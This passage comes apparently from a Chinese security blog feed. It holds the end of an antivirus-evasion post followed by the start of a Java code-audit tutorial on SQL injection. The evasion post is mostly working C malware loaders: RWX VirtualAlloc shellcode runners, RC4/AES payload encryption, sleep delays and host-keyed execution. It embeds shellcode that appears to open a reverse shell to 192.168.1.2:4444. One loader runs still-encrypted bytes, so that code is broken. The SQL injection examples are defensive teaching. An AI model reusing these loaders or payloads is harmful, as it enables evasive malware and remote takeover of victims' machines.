class="type">char</span> out[<span class="number">16</span>];</span><br><span class="line">        <span class="built_in">AES_encrypt_block</span>(buffer + i, out, roundKeys);</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer + i, out, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(prev, out, <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将加密结果复制回data（确保data空间足够）</span></span><br><span class="line">    <span class="built_in">memcpy</span>(data, buffer, len);</span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------- 主函数：双重加密Shellcode并执行 ----------------</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 示例Shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_original[] = <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>;</span><br><span class="line">    <span class="type">int</span> orig_len = <span class="built_in">sizeof</span>(shellcode_original) - <span class="number">1</span>; <span class="comment">// 排除结束符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为加密预留足够空间（AES零填充到16字节倍数）</span></span><br><span class="line">    <span class="type">int</span> padded_len = ((orig_len + <span class="number">15</span>) / <span class="number">16</span>) * <span class="number">16</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buffer = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(padded_len);</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, padded_len);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, shellcode_original, orig_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// RC4加密（第一重加密）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> rc4_key[] = <span class="string">&quot;secretkey&quot;</span>;</span><br><span class="line">    <span class="type">int</span> rc4_key_len = <span class="built_in">sizeof</span>(rc4_key) - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">rc4_crypt</span>(buffer, orig_len, rc4_key, rc4_key_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// AES加密（第二重加密）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> aes_key[] = <span class="string">&quot;1234567890123456&quot;</span>; <span class="comment">// 16字节密钥</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> aes_iv[]  = <span class="string">&quot;1234567890123456&quot;</span>; <span class="comment">// 16字节IV</span></span><br><span class="line">    <span class="type">int</span> aes_padded_len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">aes_encrypt</span>(buffer, orig_len, aes_key, aes_iv, &amp;aes_padded_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分配可执行内存（使用AES加密后的长度）</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, aes_padded_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span>(exec == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(buffer);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer, aes_padded_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理加密缓冲区</span></span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行解密后的Shellcode（注：实际场景中，Shellcode需先解密后才能执行，此处仅展示加密链路）</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-动态免杀">2. 动态免杀</h3><ul><li>定义：通过隐藏运行时行为，避免杀软动态检测。</li><li>常见方法：<ul><li>分离加载<code>Shellcode</code></li><li>使用合法<code>API</code></li><li>多线程技术</li><li>延迟执行</li></ul></li></ul><h4 id="延迟执行Shellcode">延迟执行<code>Shellcode</code></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 延迟执行Shellcode</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5000</span>); <span class="comment">// 延迟5秒</span></span><br><span class="line"><span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">((<span class="built_in">void</span>(*)())exec)();</span><br></pre></td></tr></table></figure><h4 id="参考代码-2">参考代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01\x02\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>); <span class="comment">// 延迟5秒</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-内存免杀">3. 内存免杀</h3><ul><li>定义：将恶意代码加载到内存中执行，避免文件落地触发杀软检测。</li><li>常见方法：<ul><li>使用反射加载技术</li><li>利用进程注入</li><li>使用合法的内存分配<code>API</code></li></ul></li></ul><h4 id="反射加载DLL">反射加载DLL</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载DLL</span></span><br><span class="line"><span class="type">void</span>* dllMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(dllMemory, dllData, dllSize);</span><br><span class="line">((<span class="built_in">void</span>(*)())dllMemory)();</span><br></pre></td></tr></table></figure><h4 id="参考代码-3">参考代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌入DLL二进制数据（示例使用MessageBoxA）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dllData[] = &#123;</span><br><span class="line">    <span class="comment">// 此处放置DLL的二进制数据（实际需替换为真实DLL）</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD dllSize = <span class="built_in">sizeof</span>(dllData);</span><br><span class="line">    <span class="type">void</span>* dllMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(dllMemory, dllData, dllSize);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行DLL入口函数</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())dllMemory)();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-行为免杀">4. 行为免杀</h3><ul><li>定义：通过模拟合法程序的行为，避免引起杀软怀疑。</li><li>常见方法：<ul><li>限制恶意代码的执行条件</li><li>使用合法的系统回调函数</li><li>模拟用户操作行为</li></ul></li></ul><h4 id="限制执行条件">限制执行条件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 限制执行条件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsAdmin</span>() &amp;&amp; <span class="built_in">IsTargetMachine</span>()) &#123;</span><br><span class="line">    <span class="built_in">ExecuteMaliciousCode</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参考代码-4">参考代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">IsAdmin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;</span><br><span class="line">    PSID AdministratorsGroup;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">AllocateAndInitializeSid</span>(&amp;NtAuthority, <span class="number">2</span>, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;AdministratorsGroup))</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    </span><br><span class="line">    BOOL isAdmin;</span><br><span class="line">    <span class="built_in">CheckTokenMembership</span>(<span class="literal">NULL</span>, AdministratorsGroup, &amp;isAdmin);</span><br><span class="line">    <span class="built_in">FreeSid</span>(AdministratorsGroup);</span><br><span class="line">    <span class="keyword">return</span> isAdmin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">IsTargetMachine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> hostname[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">GetComputerName</span>(hostname, &amp;size);</span><br><span class="line">    <span class="keyword">return</span> _stricmp(hostname, <span class="string">&quot;TARGET-MACHINE&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsAdmin</span>() &amp;&amp; <span class="built_in">IsTargetMachine</span>()) &#123;</span><br><span class="line">        <span class="comment">// 执行恶意代码</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;Malicious code executed!&quot;</span>, <span class="string">&quot;Info&quot;</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/6TR4IV1uZgSUfb_pFnb1-w">https://mp.weixin.qq.com/s/6TR4IV1uZgSUfb_pFnb1-w</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计漏洞点(基础)</title>
      <link href="/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/"/>
      <url>/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/</url>
      
        <content type="html"><![CDATA[<h2 id="审计流程">审计流程</h2><h3 id="Servlet生命周期"><code>Servlet</code>生命周期</h3><p><img src="/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/image-20250401162609929.png" alt="image-20250401162609929"></p><p><code>Servlet</code>生命周期可被定义为从创建直到毁灭的整个过程。以下是<code>Servlet</code>遵循的过程<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>：</p><ul><li><p><code>Servlet</code>初始化后调用 <strong>init ()</strong> 方法。</p></li><li><p><code>Servlet</code>调用 <strong>service()</strong> 方法来处理客户端的请求。</p></li><li><p><code>Servlet</code>销毁前调用 <strong>destroy()</strong> 方法。</p></li><li><p>最后，<code>Servlet</code>是由<code>JVM</code>的垃圾回收器进行垃圾回收的。</p></li></ul><p>简单介绍一下使用到的几种方法。</p><ul><li><strong><code>init()</code>方法</strong></li></ul><p><code>init</code>方法被设计成只调用一次。它在第一次创建<code>Servlet</code>时被调用，在后续每次用户请求时不再调用。因此，它是用于一次性初始化。</p><ul><li><strong><code>service()</code>方法</strong></li></ul><p><code>service()</code>方法是执行实际任务的主要方法。<code>Servlet</code>容器（即<code>Web</code>服务器）调用<code>service()</code>方法来处理来自客户端（浏览器）的请求，并把格式化的响应写回给客户端。</p><p>每次服务器接收到一个<code>Servlet</code>请求时，服务器会产生一个新的线程并调用服务。<code>service()</code>方法检查<code>HTTP</code>请求类型（<code>GET、POST、PUT、DELETE </code>等），并在适当的时候调用<code>doGet、doPost、doPut，doDelete</code>等方法</p><ul><li><strong><code>destroy</code>方法</strong></li></ul><p><code>destroy()</code>方法只会被调用一次，在<code>Servlet</code>生命周期结束时被调用。<code>destroy()</code>方法可以让您的<code>Servlet</code>关闭数据库连接、停止后台线程、把<code>Cookie</code>列表或点击计数器写入到磁盘，并执行其他类似的清理活动。</p><h3 id="Servlet审计">Servlet审计</h3><p>找<code>Controller</code>文件，找<code>mapping</code>路由。</p><p>…</p><h3 id="Springboot审计">Springboot审计</h3><p>找<code>Controller</code>再找<code>mapping</code>路由。</p><p>…</p><h2 id="SQL注入">SQL注入</h2><p><code>Java</code>中常见的连接数据库的方式：<code>Mybatis</code>、<code>JDBC</code>、<code>Hibernate</code>等。在<code>Java</code>中存在注入的参数类型要为字符型。</p><h3 id="JDBC中的SQL注入"><code>JDBC</code>中的SQL注入</h3><p><code>JDBC</code>中常用的几个执行<code>SQL</code>语句的方式<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，分别为：</p><ul><li><p><code>Statement</code>：用于执行普通的<code>SQL</code>语句，不带有参数。</p></li><li><p><code>PrepareedStatement</code>：用于执行预编译的<code>SQL</code>语句，可以带有参数，防止<code>SQL</code>注入。</p></li><li><p><code>CallableStatement</code>：用于执行数据库存储过程。</p></li></ul><h4 id="动态拼接参数">动态拼接参数</h4><p>直接将参数拼接到了<code>SQL</code>语句中执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态拼接字符串</span></span><br><span class="line">Stringsql=<span class="string">&quot;select * from users where id = &#x27;&quot;</span>+ id +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">ResultSetrs= statement.executeQuery(sql);</span><br></pre></td></tr></table></figure><h4 id="错误使用预编译">错误使用预编译</h4><p>原理：<code>PreparedStatement</code>不会对拼接的字符串进行预处理。</p><p>正确的使用预编译，不存在注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安全代码</span></span><br><span class="line">Stringsql=<span class="string">&quot;select * from users where id = ?&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement= conn.prepareStatement(sql);</span><br><span class="line">        preparestatement.setString(<span class="number">1</span>, username);</span><br><span class="line">ResultSetrs= preparestatement.executeQuery();</span><br></pre></td></tr></table></figure><p>错误使用预编译，存在注入！！！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//没有正确使用预编译方式，SQL语句还是进行了动态拼接</span></span><br><span class="line">Stringsql=<span class="string">&quot;select * from users where id = &#x27;&quot;</span>+ id +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement= conn.prepareStatement(sql);</span><br><span class="line">ResultSetrs= preparestatement.executeQuery();</span><br></pre></td></tr></table></figure><p>简单说，由于开发人员疏忽或经验不足等原因，虽然使用了预编译 <code>PreparedStatement</code> ，但没有根据标准流程对参数进行标记，依旧使用了动态拼接SQL语句的方式，进而造成SQL注入漏洞。</p><h4 id="Order-By注入"><code>Order By</code>注入</h4><p>在使用<code>PreparedStatement</code>预编译时，会将传递的任意参数预编译，进而变为字符串。而<code>order by</code>需要的是<strong>字段名</strong>，而<strong>不是字符串</strong>。所以，在使用<code>order by</code>时，就不能使用预编译了。因此，<code>order by</code>位置也是出现<code>sql</code>注入重灾区。</p><p><strong>字段名</strong>是<code>SQL</code>语句的一部分，而字符串不是。预编译后<code>SQL</code>语句就会变成<code>ORDER BY 'username'</code>，故报错。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//错误使用，报错⚠️。</span></span><br><span class="line">Stringsql=<span class="string">&quot;SELECT * FROM users ORDER BY ?&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement= conn.prepareStatement(sql);</span><br><span class="line">        preparestatement.setString(<span class="number">1</span>, username);</span><br><span class="line">ResultSetrs= preparestatement.executeQuery();</span><br></pre></td></tr></table></figure><p>所以，代码中常常使用的方法是拼接字段，拼接不当就会出现注入问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//order by 的sql注入。</span></span><br><span class="line">Stringsql=<span class="string">&quot;select * from users&quot;</span>+<span class="string">&quot; order by &quot;</span>+ id;</span><br><span class="line">PreparedStatementpreparestatement= conn.prepareStatement(sql);</span><br><span class="line">ResultSetrs= preparestatement.executeQuery();</span><br></pre></td></tr></table></figure><p>实际代码应用中，常常使用白名单的方式去限制<strong>字段名</strong>，进而防止注入。</p><h3 id="Mybatis中的SQL注入"><code>Mybatis</code>中的<code>SQL</code>注入</h3><p><code>MyBatis</code>是一个流行的<code> Java</code> 持久层框架，用于简化与数据库的交互。它通过提供一种对象关系映射（<code>ORM</code>）的方式，使得<code> Java</code> 程序员可以更方便地执行数据库操作（如查询、插入、更新、删除）。与传统的<code> JDBC</code> 相比，<code>MyBatis</code> 提供了更高层次的抽象，并且比<code> JPA</code>（<code>Hibernate</code> 等）更灵活、易于配置。</p><h4 id="MyBatis基础知识"><code>MyBatis</code>基础知识</h4><h5 id="MyBatis主要特点"><code>MyBatis</code>主要特点</h5><ul><li><strong>SQL映射：</strong><code>MyBatis</code>允许开发者使用原生的<code>SQL</code>语句来操作数据库。它将<code>SQL</code>查询与<code>Java</code>方法进行映射，使得开发者可以完全控制<code>SQL</code>执行过程，同时享受框架带来的简化和支持。</li><li><strong>动态SQL：</strong> <code>MyBatis</code>支持动态生成<code>SQL</code>查询，提供了<code>&lt;if&gt;</code>、<code>&lt;choose&gt;</code>、<code>&lt;foreach&gt;</code>等标签，可以根据不同的条件动态生成<code>SQL</code>，避免了冗长且复杂的条件判断逻辑。</li><li><strong>简洁的XML配置：</strong> <code>MyBatis</code> 使用<code> XML</code> 文件来配置数据库映射，开发者通过定义 <code>SQL</code> 语句和映射规则，控制<code> Java</code> 对象与数据库表之间的映射关系。</li><li><strong>接口和注解支持：</strong><code> MyBatis</code> 提供了基于接口的<code>API</code>，开发者可以在<code> Java</code> 接口中定义数据库操作方法，并通过注解或者 <code>XML</code>配置映射 <code>SQL</code> 语句。</li><li><strong>强大的缓存机制：</strong> <code>MyBatis</code> 提供了一级缓存和二级缓存。一级缓存是基于 <code>SqlSession</code> 级别的缓存，二级缓存是跨 <code>SqlSession</code> 共享的缓存，默认情况下启用。</li><li><strong>支持事物管理：</strong> <code>MyBatis</code> 支持与 <code>Java</code> 的事务管理整合，确保数据库操作的原子性和一致性。</li></ul><h5 id="Mybatis的工作原理"><code>Mybatis</code>的工作原理</h5><ul><li><p>**<code>SqlSessionFactory</code>:**这是 MyBatis 的核心工厂类，负责创建 <code>SqlSession</code> 对象。<code>SqlSession</code> 是 MyBatis 中用于执行 <code>SQL</code> 语句的主要接口，它通过配置文件读取数据库连接信息，创建并维护数据库连接。</p></li><li><p>**<code>Mapper XML</code>文件：**在<code>MyBatis</code>中，<code>SQL</code>语句通常在<code>XML</code>配置文件中定义，开发者需要为每个数据库操作编写对应的<code>Mapper</code>文件。这个文件会包含<code>SQL</code>语句及其映射规则。</p></li><li><p>**<code>Mapper</code>接口：**开发者通常会创建接口，定义一些方法，这些方法通过<code>XML</code>或注解来与具体的<code>SQL</code>语句进行绑定。</p></li><li><p>**映射过程：**当应用程序调用 <code>SqlSession</code> 的方法时，<code>MyBatis</code> 会根据 <code>Mapper</code> 接口或注解提供的<code>SQL</code>语句信息执行相应的数据库操作，并将结果自动映射为<code>Java</code>对象，返回给开发者。</p></li></ul><h5 id="Mybatis的使用步骤"><code>Mybatis</code>的使用步骤</h5><ul><li><strong>配置<code>Mybatis</code>:</strong> 通过<code>mybatis-config.xml</code> 文件进行配置，配置数据库连接、缓存、日志等。</li><li>**定义<code>Mapper</code>: ** 创建<code>Mapper</code>接口或类，定义<code>SQL</code>操作的方法。</li><li><strong>编写<code>Mapper XML</code>:</strong> 为每个<code>SQL</code>操作编写对应的<code>XML</code>文件，定义<code>SQL</code>语句与<code>Mapper</code>方法的映射关</li><li><strong>创建<code>SqlSessionFactory</code>:</strong> 通过配置文件创建 <code>SqlSessionFactory</code>，获取 <code>SqlSession</code>。</li><li>**执行<code>SQL</code>操作：**通过<code>SqlSession</code>执行<code>SQL</code>语句，获取查询结果或执行更新操作。</li></ul><p><strong><code>MyBatis</code>的代码示例</strong></p><p>以下是一个简单的<code>MyBatis</code>的使用示例。</p><p><code>MyBatis</code>配置文件<code>mybatis-config.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/example/mapper/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Mapper 接口 